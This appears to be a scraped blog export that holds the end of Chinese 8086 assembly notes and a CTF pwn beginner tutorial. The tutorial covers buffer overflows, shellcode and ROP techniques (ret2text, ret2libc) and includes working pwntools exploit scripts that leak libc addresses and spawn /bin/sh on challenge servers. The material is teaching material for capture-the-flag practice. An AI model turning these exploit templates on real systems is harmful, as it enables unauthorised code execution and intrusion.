10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序。\n\n(ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置。\n\n(ah)=9表示调用第10h号中断例程的9号子程序，功能为在光标位置显示字符，可以提供要显示的字符、颜色属性、页号、字符重复个数作为参数。\n\nbl中的颜色属性的格式如下：\n\n| 7    | 6    | 5       | 4    | 3    | 2    | 1       | 0    |\n| ---- | ---- | ------- | ---- | ---- | ---- | ------- | ---- |\n| BL   | R    | G       | B    | I    | R    | G       | B    |\n| 闪烁 |      | 4~6背景 |      | 高亮 |      | 0~2前景 |      |\n\n编程，在屏幕的5行12列显示3个红底高亮闪烁绿色的'a'。\n\n```asm\nassume cs:code\ncode segment\n\tmov ah,2\t\t\t\t;置光标\n\tmov bh,0\t\t\t\t;第0页\n\tmov dh,5\t\t\t\t;dh中放行号\n\tmov dl,12\t\t\t\t;dl中放列号\n\tint 10h\n\t\n\tmov ah,9\t\t\t\t;在光标位置显示字符\n\tmov al,'a'\t\t\t\t;字符\n\tmov bl,11001010b\t\t;颜色属性\n\tmov bh,0\t\t\t\t;第0页\n\tmov cx,3\t\t\t\t;字符重复个数\n\tint 10h\n\t\n\tmov ax,4c00h\n\tint 21h\ncode ends\nend\n```\n\n## 13.2 DOS中断例程\n\nint 21h中断例程是DOS提供的中断例程，其中包含了DOS提供给程序员在编程时调用的子程序。\n\n前面一直使用的是int 21h中断例程的4ch号功能，即程序返回功能\n\n```asm\nmov ah,4ch\t\t;程序返回\nmov al,0\t\t;返回值\nint 21h\n```\n\n(ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数。\n\n编程，在屏幕的5行12列显示字符串“Welcome to masm!”\n\n```asm\nassume cs:code,ds:data\ndata segment\n\tdb 'Welcome to masm!'\ndata ends\ncode segment\nstart:\tmov ah,2\t\t\t\t;置光标\n\t\tmov bh,0\t\t\t\t;第0页\n\t\tmov dh,5\t\t\t\t;dh中放行号\n\t\tmov dl,12\t\t\t\t;dl中放列号\n\t\tint 10h\n\t\t\n\t\tmov ax,data\n\t\tmov ds,ax\n\t\tmov dx,0\t\t\t\t;ds:dx指向字符串的首地址data:0\n\t\tmov ah,9\n\t\tint 21h\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncode ends\nend start\n```\n\n# 14. 端口\n\n在PC机系统中，和CPU通过总线相连的芯片除各种存储器外，还有以下三种芯片\n\n1. 各种接口卡(网卡、显卡)上的接口芯片，它们控制接口卡进行工作\n2. 主板上的接口芯片，CPU通过它们对部分外设进行访问\n3. 其他芯片，用来存储相关的系统信息，或进行相关的出入输出处理\n\n从CPU的角度，将寄存器都当作端口，对它们进行统一编址，从而建立了一个统一的端口地址空间。每一个端口在地址空间中都有一个地址。\n\nCPU可以直接读写以下3个地方的数据：\n\n1. CPU内部的寄存器\n2. 内存单元\n3. 端口\n\n## 14.1 端口的读写\n\n因为端口所在的芯片和CPU通过总线相连，所以端口地址和内存地址一样，通过地址总线来传送。在PC系统中，CPU最多可以定位64KB个不同的端口，端口地址的范围为0~65535\n\n端口的读写指令只有两条：in和out，分别用于从端口读取数据和往端口写入数据。\n\n**访问内存：**\n\n```asm\nmov ax,ds:[8]\t\t\t\t;假设执行前(ds)=0\n```\n\n①CPU通过地址线将地址信息8发出\n\n②CPU通过控制线发出内存读命令，选中存储器芯片并通知它将要从中读取数据\n\n③存储器将8号单元中的数据通过数据线送入CPU\n\n**访问端口：**\n\n```asm\nin al,60h\t\t\t\t\t;从60h号端口读入一个字节\n```\n\n①CPU通过地址线将地址信息60h发出\n\n②CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它将要从中读取数据\n\n③端口所在的芯片将60h端口中的数据通过数据线送入CPU\n\n注：在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口中的数据。访问8位端口时用al，访问16位时用ax。\n\n对0~255以内的端口进行读写时：\n\n```asm\nin al,20h\t\t\t\t;从20h端口读入一个字节\nout 20h,al\t\t\t\t;往20h端口写入一个字节\n```\n\n对256~65535的端口进行读写时，端口号放在dx中：\n\n```asm\nmov dx,3f8h\t\t\t\t;将端口号3f8h送入dx\nin al,dx\t\t\t\t;从3f8h端口读入一个字节\nout dx,al\t\t\t\t;往3f8h端口写入一个字节\n```\n\n## 14.2 shl和shr指令\n\nshl和shr是逻辑移位指令。\n\nshl是逻辑左移指令，它的功能为：\n\n- 将一个寄存器或内存单元中的数据向左移位\n- 将最后移出的一位写入CF中\n- 最低位用0补充\n\n```asm\nmov al,01001000b\nshl al,1\t\t\t\t\t;将al中的数据左移一位\n```\n\n执行后(al)=10010000b，CF=0\n\nshr是逻辑右移指令：\n\n- 将一个寄存器或内存单元中的数据向右移位\n- 将最后移出的一位写入CF中\n- 最高位用0补充\n\n```asm\nmov al,10000001b\nshr al,1\n```\n\n执行后(al)=01000000b，CF=1\n\n## 14.3 CMOS RAM芯片\n\nCMOS特征：\n\n1. 包含一个实时钟和一个有128个存储单元的RAM存储器\n2. 该芯片靠电池供电，关机后其内部的实时钟仍可正常工作，RAM中的信息不丢失\n3. 128个字节的RAM中，内部实时钟占用0~0dh单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时BIOS程序读取。\n4. 芯片内部有两个端口，端口地址为70h和71h。CPU通过这两个端口读写CMOS\n5. 70h为地址端口，存放要访问的CMOS RAM单元的地址；71h为数据端口，存放从选定的CMOS单元中读取的数据，或要写入到其中的数据。CPU对CMOS的读写分两步进行，读CMOS的2号单元：①将2送入端口70h；②从端口71h读出2号单元的内容\n\n在CMOS中，存放这当前的时间：年、月、日、时、分、秒。这6个信息的长度都为1个字节。存放单元为：秒：0\t\t分：2\t\t时：4\t\t日：7\t\t月：8\t\t年：9\n\n这些数据以BCD码的方式存放。BCD码是以4位二进制数表示十进制数码的编码方法。数值26，用BCD码表示为：0010 0110\n\n1个字节表示2个BCD码，高4位的BCD码表示十位，低4位的BCD码表示个位。\n\n编程，在屏幕中间显示当前的月份\n\n```asm\nassume cs:code\ncode segment\nstart:\tmov al,8\t\t\n\t\tout 70h,al\t\t\t;从8号单元读出当前月份的BCD码\n\t\tin al,71h\t\t\t;从数据端口71h中取得指定单元中的数据\n\t\t\n\t\tmov ah,al\t\t\t;al中为从CMOS的8号单元中读出的数据\n\t\tmov cl,4\n\t\tshr ah,cl\t\t\t;ah中为月份的十位数码值\n\t\tand al,00001111b\t;al中为月份的个位数码值\n\t\t\n\t\tadd ah,30h\n\t\tadd al,30h\t\t\t;显示对应的ASCII码字符\n\t\t\n\t\tmov bx,0b800h\n\t\tmov es,bx\n\t\tmov byte ptr es:[160*12+40*2],ah\t\t;显示月份的十位数码\n\t\tmov byte ptr es:[160*12+40*2+2],al\t\t;显示月份的个位数码\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncode ends\nend start\n```\n\n# 15. 外中断\n\n外设输入不直接送入内存和CPU，而是送入相关的接口芯片的端口中；CPU向外设的输出也不是直接送入外设，而是先送入端口中，再由相关芯片送到外设。\n\n在PC系统中，外中断源一共有以下两类：\n\n1. 可屏蔽中断\n\n可屏蔽中断是CPU可以不响应的外中断。CPU是否响应要看标志寄存器的IF位。如果IF=1，CPU在执行完当前指令后响应中断，引发中断过程；如果IF=0，不响应可屏蔽中断。\n\n8086CPU提供设置IF的指令如下：\n\n```asm\nsti\t\t;设置IF=1\ncli\t\t;设置IF=0\n```\n\n2. 不可屏蔽中断\n\n不可屏蔽中断是CPU必须响应的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。对于8086CPU，不可屏蔽中断的中断类型码固定为2，所以中断过程中，不需要取中断类型码。则不可屏蔽中断的中断过程为：\n\n①标志寄存器入栈，IF=0，TF=0\n\n②CS、IP入栈\n\n③(IP)=8，(CS)=(0ah)\n\n\n\n","categories":["Windows逆向"],"tags":["汇编"]},{"title":"pwn基础入门","url":"/posts/1c971db4.html","content":"\n\n\n# 1. Linux入门\n\n| 命令            | 含义                            | 示例                     |\n| --------------- | ------------------------------- | ------------------------ |\n| pwd             | 输出当前路径                    | pwd                      |\n| ls              | 列出位于当前路径的文件          | ls -al                   |\n| cd xxx          | 改变当前路径，前往xxx目录       | cd ~/workspace           |\n| cat xxx         | 直接展示xxx文件的内容           | cat hw.c                 |\n| *** \\| grep xxx | ***是其他命令，输出含有xxx的行  | cat hw.c \\| grep stdio.h |\n| *** \\| less     | 查看输出更舒服，jk上下移动q退出 | cat hw.c \\| less         |\n| ./xxx           | 运行当前目录xxx可执行文件       | ./a.out                  |\n\n# 2. 汇编基础\n\n 内存地址：在有段/偏移寄存器的语境下一般记为`段:偏移`，如`CS:IP`,`SS:IP`,`SS:BP`,`DS:DI`,`DS:SI`,`DS:[]`\n$$\n一个内存地址=段地址×16+偏移地址\\\\\n1234h:ABCDh=12340h+ABCDh=1CF0Dh\n$$\n小端序：低地址存放低位数据\n\n一个程序的内存空间：\n\n| 高地址 | OS Kernel Space  |\n| ------ | :--------------: |\n|        |      Stack       |\n|        |     ↓(blank)     |\n|        | Shared Libraries |\n|        |     ↑(blank)     |\n|        |       Heap       |\n|        |       BSS        |\n|        |  Data(RW)数据段  |\n|        |  Text(RX)代码段  |\n| 低地址 |     (blank)      |\n\n栈：\n\n|   SS:SP 栈顶   |\n| :------------: |\n| SS:BP 栈帧基底 |\n|    SS 栈底     |\n\n寄存器总结\n\n| name | 用途                     | name                        | 用途                 |\n| ---- | ------------------------ | --------------------------- | -------------------- |\n| AX   | 通常用来存放函数的返回值 | SS(Stack Seg)               | 栈的段地址/基地址    |\n| CX   | 通常用来做循环计数器     | CS(Code Seg)                | 下一条指令的段地址   |\n| BX   |                          | DS(Data Seg)                | 数据的段地址         |\n| DX   |                          | **SP(Stack Pointer)**       | 栈顶偏移地址         |\n|      |                          | **BP(Base Pointer)**        | 栈的基址偏移地址     |\n|      |                          | **IP(Instruction Pointer)** | 下一条指令的偏移地址 |\n\n汇编指令\n\n![汇编指令](F:\\markdown图片\\pwn知识点\\汇编指令.png)\n\n# 3. 程序装载与栈帧结构\n\n在Linux的可执行文件ELF\n\nELF文件类型：\n\n- Relocatable File(*.o)：可重定位文件，用来链接的素材\n- Executable File(*)：可执行文件\n- Shared Object File(*.so)：共享目标文件，用于做动态链接库\n\n# 4. 实战环境配置和工具介绍\n\n连接远程服务器：\n\nnc表示netcat\n\n```\nnc node4.buuoj.cn 28487\n```\n\n使用file查看文件信息，checksec查看文件保护信息。\n\n{% asset_img checksec.png 文件信息 %}\n\n利用gdb调试ELF文件：\n\n| 命令      | 简写 | 说明                                                         |\n| --------- | ---- | ------------------------------------------------------------ |\n| file      |      | 装载一个文件，可以在gdb后加参数，效果等同                    |\n| kill      |      | 终止当前调试的进程                                           |\n| run       | r    | 运行当前装载的文件，运行过程中使用Ctrl + C退出程序交互，进入调试(在退出时位置) |\n| next      | n    | =step over 单步步过                                          |\n| step      | s    | =step into 单步步入                                          |\n| continue  | c    | 继续执行程序，直到下一个中断或程序结束                       |\n| finish    | fini | 运行到函数返回处                                             |\n| catch     |      | 设置捕捉点                                                   |\n| thread    | t    | 查看当前程序的线程信息                                       |\n| break     | b    | 在当前位置设置断点                                           |\n| backtrace | k    | 查看当前函数调用栈信息                                       |\n| stack     |      | stack n 查看栈内容                                           |\n| vmmap     |      | 查看程序中的分段，相当于OD中的`E`模块                        |\n\n# 5. 缓冲区溢出\n\n编写程序时没有考虑或错误设置用户输入长度，导致用户向缓冲区输入长度超过接受变量长度，从而覆盖到其它正常数据，破坏栈帧结构。\n\n缓冲区溢出常见的漏洞函数：\n\n```c\nchar *gets(char *str);\n\nint read(int handle, void *buf, int len);\n\nint scanf(const char *format, ...);\n\nint getchar(void);\n\nint printf(const char *restrict format, ...);\n```\n\n如果文件中有\"/bin/sh\"，可用以下脚本：\n\n```python\nfrom pwn import *\ncontext(log_level='debug', os='linux', arch='amd64', bits=64)\ncontext.terminal = ['/usr/bin/x-terminal-emulator', '-e']\n\n# Interface\nlocal = True\nbinary_name = 'filename'\nport = 12345\n\nif local:\n    p = process([\"./\" + binary_name])\n    e = ELF('./' + binary_name)\n    # libc = ELF('e.libc')\nelse:\n    p = remote(\"ctf.spaceskynet.top\", port)\n    e = ELF(\"./\" + binary_name)\n    # libc = ELF(\"libc-2.23.so\")\n   \ndef z(a=''):\n    if local:\n        gdb.attach(p, a)\n        if a == '':\n            raw_input()\n        else:\n            pass\nru = lambda x: p.recvuntil(x)\nrc = lambda x: p.recv(x)\nsl = lambda x: p.sendline(x)\nsd = lambda x: p.send(x)\nsla = lambda delim, data: p.sendlineafter(delim, data)\n\n# main\nif __name__ == \"__main__\":\n    z('b foo')\t\t#在foo函数下断\n    # 如果直到backdoor和binsh的地址可直接写地址\n    # backdoor = 0x08049172\n    # bin_sh = 0x0804A008\n    backdoor = e.symbols['backdoor']\t#参数为函数名字\n    bin_sh = next(e.search(b'/bin/sh')) #在ELF文件中找/bin/sh\n    main_addr = e.symbols['main']\n    payload = b'a' * 0x1c + p32(backdoor) + p32(main_addr) + p32(bin_sh)\t# 即执行完backdoor函数后返回到main函数\n    sl(payload)\n    p.interactive()\n```\n\n# 6. Shellcode\n\nshellcode就是能使程序调用shell的一段代码(通常为汇编级别/机器码)。一旦某种shellcode被执行，我们就能够拿到目标机器的控制权限，从而获取flag。\n\n- system(\"/bin/sh\");（？） -> execve(\"/bin/sh\", 0, 0)\n- 触发中断(int 0x80 / syscall)\n\n```asm\n; first.asm\n; first get shell test in pwn class\n; nasm -f elf32 first.asm\n; ld -m elf_i386 -o getShell first.o\n; objump -d getShell\n\nglobal _start\n_start:\n\tpush \"/sh\"\n\tpush \"/bin\"\n\tmov ebx, esp\n\txor edx, edx\n\txor ecx, ecx\n\tmov al, 0xb\n\tint 0x80\n```\n\nShellcode脚本：\n\n```python\nfrom pwn import *\n\nif __name__ == '__main__':\n    context(os='linux', arch='amd64', bits=64)\n    payload1 = asm(shellcraft.sh())\n    My_Shellcode = \"\"\"\n    mov rbx, 0x68732f6e69622f\n    push rbx\n    push rsp\n    pop rdi\n    xor esi, esi\n    xor edx, edx\n    push 0x3b\n    pop rax\n    syscall\n    \"\"\"\n    payload2 = asm(My_Shellcode)\n    p = process('./mrctf2020_shellcode')\n    # p = remote('node3.buuoj.cn', 25266)\n    # p.sendline(payload1)\n    p.sendline(payload2)\n    p.interactive()\n```\n\n# 7. ROP链构造\n\nNX——NO Execute bit(禁止执行位)是应用在CPU上的安全技术，它支持了操作系统级别的DEP——Data Execute Prevention(数据执行保护，Microsoft)。在应用了NX的系统上，(如果可执行文件开启保护)，会把内存中的区域分为只供存储指令和只供存储数据两种。NX bit 被标记在内存分页中使用的页表索引上，如果置1，则该页内存数据不允许被执行，即把所有内容作为数据处理。这样可以防范shellcode注入攻击。\n\nROP——Return-Oriented Programming(返回导向编程)技术，允许攻击者在开启了栈不可执行等安全保护技术的情况下，执行恶意代码。\n\n核心思想是通过栈溢出等方式，改写栈上的控制信息(调用栈，即return address, rbp等)，以控制调用栈，劫持程序控制流并执行一些针对性的命令序列(gadgets)。\n\ngadgets主要指一些以ret结尾的小段汇编指令，它们的执行通过ret语句和栈上控制的返回地址相连，构成一条ROP链。链的功能是设置寄存器值，泄露信息，调用函数等。\n\n## 7.1 Ret2Text\n\ngadget一般存在于Text中，或者广义上存在于ELF文件中(指令部分)。将返回地址改写为能执行某些特定功能的gadget地址，构造ROP链。\n\n辅助工具：ropper、pwntools(ELF class)\n\n```python\nfrom pwn import *\ncontext(log_level='debug', os='linux', arch='amd64', bits=64)\ncontext.terminal = ['/usr/bin/x-terminal-emulator', '-e']\n\n# Interface\nlocal = True\nbinary_name = 'filename'\nport = 12345\n\nif local:\n    p = process([\"./\" + binary_name])\n    e = ELF('./' + binary_name)\n    # libc = ELF('e.libc')\nelse:\n    p = remote(\"ctf.spaceskynet.top\", port)\n    e = ELF(\"./\" + binary_name)\n    # libc = ELF(\"libc-2.23.so\")\n   \ndef z(a=''):\n    if local:\n        gdb.attach(p, a)\n        if a == '':\n            raw_input()\n        else:\n            pass\nru = lambda x: p.recvuntil(x)\nrc = lambda x: p.recv(x)\nsl = lambda x: p.sendline(x)\nsd = lambda x: p.send(x)\nsla = lambda delim, data: p.sendlineafter(delim, data)\n\n# main\nif __name__ == \"__main__\":\n    # backdoor = e.plt['system']\n    backdoor = e.symbols['backdoor']\t#参数为函数名字\n    bin_sh = next(e.search(b'/bin/sh')) #在ELF文件中找/bin/sh\n    poprdi = 0x4011eb\n    payload = b'a' * 0x10 + b'b' * 0x08 + p64(poprdi) + p64(bin_sh) + p64(backdoor)\t# 将当前rdi的值扔掉，bin_sh的地址赋给rdi，作为参数调用backdoor中的system\n    sl(payload)\n    p.interactive()\n```\n\n如果文件中没有system函数，如果想要调用system函数，要利用到PLT表。\n\n## 7.2 Ret2syscall\n\n- 一般为静态链接的可执行文件，指令非常多，也提供了许多gadget\n\n\n- 最核心gadget：syscall(int 0x80)\n\n\n- 整体类似Shellcode注入\n\n{% asset_img 7.2.1.png 静动态链接 %}\n\n静态链接的ELF文件在IDA的函数窗口全是一片白，没有粉色的动态链接。\n\n利用ROPgadget工具，自行生成ROP链。\n\n## 7.3 PLT表和GOT表\n\n[GOT表和PLT表](https://blog.csdn.net/qq_52126646/article/details/119494939)\n\n这里的PLT表示`.plt`，GOT表表示`.got.plt`。`.got`存放其它全局符号信息，与`.got.plt`不同，与`.plt`关系不大。\n\n## 7.4 Ret2libc\n\n- 对动态链接文件，一般链接glibc\n\n\n- glibc链接基址未知，需要进行基址泄露\n\n\n- 一般需要程序循环，可以通过ROP链构造循环\n\n```python\nfrom pwn import *\ncontext(log_level='debug', os='linux', arch='amd64', bits=64)\ncontext.terminal = ['/usr/bin/x-terminal-emulator', '-e']\n\n# Interface\nlocal = True\nbinary_name = 'filename'\nport = 12345\n\nif local:\n    p = process([\"./\" + binary_name])\n    e = ELF('./' + binary_name)\n    # libc = ELF('e.libc')\nelse:\n    p = remote(\"ctf.spaceskynet.top\", port)\n    e = ELF(\"./\" + binary_name)\n    # libc = ELF(\"libc-2.23.so\")\n   \ndef z(a=''):\n    if local:\n        gdb.attach(p, a)\n        if a == '':\n            raw_input()\n        else:\n            pass\nru = lambda x: p.recvuntil(x)\nrc = lambda x: p.recv(x)\nsl = lambda x: p.sendline(x)\nsd = lambda x: p.send(x)\nsla = lambda delim, data: p.sendlineafter(delim, data)\n\nprdi = 0x400c83\npenc = 0x4009a0\n# main\nif __name__ == \"__main__\":\n    z('b *0x4009d1\\nb *0x400aee')\n    sla('choice',b'1')\n    payload = b'a' * 0x50 + b'b' * 0x08 + p64(prdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(penc)\t# 泄露puts函数地址\n    sla('encrypted', payload)\t\n    \n    ru(b'\\x40\\x0a')\n    log.info('start detecting libc address')\n    libc_puts = u64(p.recvuntil(b'\\x0a', drop=True).ljust(8, b'\\x00'))\n    log.success('libc puts address found:' + hex(libc_puts))\n    libc = LibcSearcher('puts', libc_puts)\n    # libc.symbols['puts']\n    \n    # libc.select_libc(0)\n    libc_addr = libc_puts - libc.dump('puts')\n    \n    rtn_addr = 0x400b27\n    payload = b'a' * 0x50 + b'b' * 8\n    for i in range(1):\n        payload += p64(rtn_addr)\t# for align\n    payload += p64(prdi) + p64(libc_addr + libc.dump(\"str_bin_sh\")) + p64(libc_addr + libc.dump(\"system\"))\n    sla('encrypted', payload)\n    \n    p.interactive()\n```\n\n# 8. ELF保护措施及绕过方法\n\n## 8.1 ASLR\n\nASLR(Address space layout randomization)——地址空间配置随机化\n\n将可执行文件、共享库、栈、堆的基址随机化，用于防范明确地址的内存破坏攻击，比如ret2libc、stack address。\n\n应对方法：地址泄露\n\n## 8.2 NX\n\n看[7.ROP链构造]\n\n## 8.3 PIE\n\nPIE(Position-independent executable)——地址无关代码/可执行文件\n\n无论文件被加载进内存空间的什么地址中，程序都能够正常运行。在共享库链接中有重要作用。共享库文件被动态链接到内存中，PIE使其能正确处理外部引用。在普通ELF文件上，ELF配合ASLR，使其基址不可预测，增加了攻击难度。\n\n整个ELF文件都会被装载进一个随机偏移的连续内存空间里，只有基址变成了未知，其它都是相同的。\n\n应对方法：Partial Writing\n\n程序的加载以内存页(4K)为单位，基地址后3位(hex)一定为0，同一文件被加载进连续地址中。\n\n一般利用Return Address控制跳转，可通过栈上已有地址，只修改最低3位(2B，4位)值，控制转向\n\n## 8.4 Canary\n\nCanary(Canary in a coal mine)——金丝雀\n\n一串随机数据，放置在栈数据和控制信息之间，函数开始时被放入，退出前检验，若被修改立即终止程序，极大地防范了栈溢出攻击。\n\n应对方法：Canary Leak\n\n- 覆盖栈到Canary处，利用puts等函数泄露地址\n- Canary最低字节为0，防止连带输出\n\n小技巧：`scanf(\"%d\");`输入\"+\"不覆盖内存数据\n\n# 9. Stack Pivot\n\n假如可供泄露空间过少，或者需要整段可控的栈空间，这就需要使栈帧移向可控栈空间，控制程序执行流转向。","categories":["漏洞渗透"],"tags":["CTF","Pwn"]}]